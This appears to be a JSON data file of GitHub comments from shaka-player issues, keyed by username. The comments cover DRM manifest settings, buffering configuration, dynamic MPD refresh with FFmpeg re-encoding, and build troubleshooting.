    "bcupac": "had a similar problem, solved it with this manifest config option:\n{\n.\n.\n.\nmanifest: {\n        dash: {\n            ignoreDrmInfo: true\n        },\n    },\n.\n.\n.\n}. ",
    "tomaas-zeman": "Unfortunately I cannot share any details about the stream, it's not public.\nThe ignoreDrmInfo helped to avoid the exception when hitting bad DRM endpoint but the stream itself is buffering 99% of the time and it's more like a slideshow. On the other hand using ignoreDrmInfo with 2.5.0-beta2 has no negative effect, e.i. the stream is smooth.\nWere there any other changes that could have affected live streaming?\nI know it's hard to reproduce but I knew that you did some modifications to DRM info extraction recently and since it works with 2.5.0-beta2 I thought that with a little bit of luck you could be able to root cause the problem just with the provided manifest / configuration\nI can maybe try to debug different shaka versions in our environment and get back to you later. I'll try the third approach and get back to you when I have something useful.. ",
    "pineapplejoe": "Sorry - I wasn't very clear.  I mean that I want buffering to happen continually.  Now it seems to buffer a little bit into the future and then it stops buffering.    \nI dont want it to stop.  I want it to try and prefetch the entire thing.\nI know that I can save the video explicitly but that is something you do before you watch.  I want to be able to start watching right away and never stop buffering.  \nDoes this make sense?. \n\nIn that case, you can set streaming.bufferingGoal to Infinity.\n\nOh interesting.  \nWhat quality level will be downloaded?  The current one or will it be variable as network capacity changes?  \n. cool.  thank you!. ",
    "bkodirov": "Unfortunately, our encoder doesn't provide CLOSED-CAPTION metadata in the Manifest.. Thank you. Since CAF(Chromecast) receiver uses shaka player, do you have any clue, whether it is gonna be available on the chromecast CAF? . ",
    "saibalaji10": "\nIf your MPD may need to be refreshed, you should always mark it as dynamic. This will ensure that the client will refresh when required. A VOD clip can still be dynamic without any issues.\nYou can use minimumUpdatePeriod to ask us to refresh periodically, or you can omit this property, signal an <InbandEventStream> with the appropriate schema, and embed an emsg box in the content to trigger a manifest refresh only when necessary.\nDoes this answer your question?\n\nOnce I stop the encoding process with FFmpeg, the MPD changes from dynamic to static. I'll start the encoding process again. The MPD is dynamic now. Shaka is not identifying this state(1.It identifies when the MPD goes from dynamic to static but not when it is changing from static to dynamic). I want the second one for my use case. The minimum update period will not be in static MPDs. \nIn my case, I'll rewrite the same MPD with the same name for the second process. I tried leaving out the MediaPresenationDuration and changing the MPD to dynamic in shaka-player.compiled.js.\nBut the player stops playing when the first segment of the next encoding process starts without showing any error.\n. Yeah, you are right. It is working as intended. But in my use case, the MPD changes from static to dynamic and I want the player to do a single check to find the change(Static to dynamic), and then load the segments which are getting updated in the MPD.\nI tried doing this but the player hangs without showing any error, after fetching the MPD(ie. Before loading the segments).\nIs there any solution for this ?. In my use case, once I start the encoding process again with FFmpeg, the same MPD file will change from static to dynamic. \nHence, I need a single check after some time (say 500ms), so that the file changes from static to dynamic again, and the normal process of dynamic MPD will continue.\n. \n\nIn your use-case, how will FFmpeg signal to the player(s) that it re-started the encoding process?\n\nThis is what I am missing right now. FFmpeg cannot signal the player. Hence I need the player to check the MPD again so that It can find that FFmpeg re-started the encoding process.\nWill that be possible?\n. Yes, let me give a low-level overview of my project. \nI have a client which constitutes of Shaka player and a server(Java Jetty HTTP/2 Server) which runs FFmpeg commands.\nFirst, the server will initially start the encoding process with a segment size (say 1 second). \nThe client which has the Shaka player will play the segments and based on certain conditions, the client will request the server to generate segments with a different segment size(Say 2 seconds).\nFor this, I have to stop the encoding process(Now the MPD changes from dynamic to static). The server will start the encoding process again with a new segment size(MPD changes from static to dynamic). This is where I need Shaka to recheck the MPD and start the routine for dynamic MPD again. This is where I am stuck now.\n. Yeah @vaage, you are right. . Thank you @vaage, the second option seems good. Will work on it.\nThank you for your help.. Hello @TheModMaker,  I am using SegmentList. I am encoding the same content. \nI have made some changes in the manifest parser. The only problem I am facing right now is : \nConsider the situation where the encoding is done till 25th segment ( ie. chunk-stream0-025.m4s). \nWhen FFmpeg stops the encoding for this segment size and then restarts the process, the segment index for the new segment size starts from 1 again( ie. chunk-stream0-001.m4s).\nShaka now starts fetching the segments only after the 26th segment and it leaves all the segments from 1st to 25th.\n. > Hello @TheModMaker, I am using SegmentList. I am encoding the same content.\n\nI have made some changes in the manifest parser. The only problem I am facing right now is :\nConsider the situation where the encoding is done till 25th segment ( ie. chunk-stream0-025.m4s).\nWhen FFmpeg stops the encoding for this segment size and then restarts the process, the segment index for the new segment size starts from 1 again( ie. chunk-stream0-001.m4s).\nShaka now starts fetching the segments only after the 26th segment and it leaves all the segments from 1st to 25th.\n\nThe playback is paused till the player fetches the 26th segment . As the latest update:\nTried modifying the Segment_Index, Segment_List.js, Now I am able to fetch all the segments in between (In the given example, It is 0th to 25th). But as soon as I start re-encoding, parameters like End in bufferData.video[0] turns to 0. I guess the video time is being reset. Shaka appends only the 26th segment into the buffer and the play resumes here. Others are being fetched only but not appended. Is there any solution for this? . \n\n\nI have attached the screenshots from the console.\nFirst, the video.buffered.start has one element(Pic 1) and then it becomes two once I start re-encoding(Pic 2). The segments are not appended in the buffer during this time. Then again video.buffered has one element and then the segments get appended to the buffer and the video starts playing(Pic 3).\n. Thank you for your support @joeyparrish. This is very helpful. ",
    "Anirudh58": "Yes sure. I think I had 2 problems. \n1) I had used sudo in my earlier commands which seemed to have locked certain files. \n2) My default python version was set to 3,  so running python build/all.py might have caused some problems because shaka required 2.7. Not sure about this. \nResolve steps:\n1) Fresh clone git clone https://github.com/google/shaka-player.git & cd into shaka-player.\n2) Run ./build/all.py. Hello Mr Joey\nI have an idea for a project with shaka-player. I need more specifics. I am\nnot getting enough clarity from the documentation. Is it possible to get in\ntouch with you and discuss further?\nRegards,\nAnirudh. It wouldn't really benefit anyone. I wouldn't mind but preferably not\npublic.. Sure thanks. I'll drop you a mail there.\nOn Thu, Mar 14, 2019, 22:02 Joey Parrish notifications@github.com wrote:\n\nYou can find my email address in the CONTRIBUTORS file.\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub\nhttps://github.com/google/shaka-player/issues/1835#issuecomment-472950956,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/ALRAaNY2x3LPJ05399P6GQZjONSc8FYOks5vWnmfgaJpZM4bqH1c\n.\n. \n",
    "cristioltean": "@avelad Thanks Alvaro , I have forwarded the email to you @johnsim . ",
    "bartt": "I signed the CLA.. I signed the CLA.. Yeah, I don't do Github pull requests often and didn't realize that all\ncommits would end up in the same PR.\nOn Fri, Mar 15, 2019 at 8:36 AM Joey Parrish notifications@github.com\nwrote:\n\nI believe I can merge these three Dolby commits in one PR. I'm going to\nupdate the PR subject line, though, since this goes beyond fixing the link.\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/google/shaka-player/pull/1844#issuecomment-473333912,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AABscZaji7mIVURommNGvZIYcqw4kg5uks5vW74TgaJpZM4b1CfK\n.\n\n\n-- \nBart Teeuwisse\nEarly riser to hack, build, run, bike, climb & ski. @google engineer.\nFormerly @twitter, @yahoo & various startups.\n@bartt https://twitter.com/bartt \u2022 thecodemill.biz\nhttps://thecodemill.biz/?sig \u2022 Santa Cruz, CA \u2022 +1 (831) 480-5106\n. ",
    "nitro404": "Should be fixed! I'm unfortunately not able to run \"test.py\" on my current environment, the script fails with an error, likely because I have Python 3 installed.. Ahh, sorry! I've adjusted my environment and fixed all outstanding issues. Updated the function description and re-based onto master as well. Let me know if any other changes are needed, thank you!. ",
    "irock": "Thanks! Yes, will do.\n. ",
    "mariomc": "Careful. The close method returns a promise that we need to wait to resolve.\nIf we wanted to renew the license of the video we're currently trying to playback, this could actually cause the current playback session to be closed.. "
}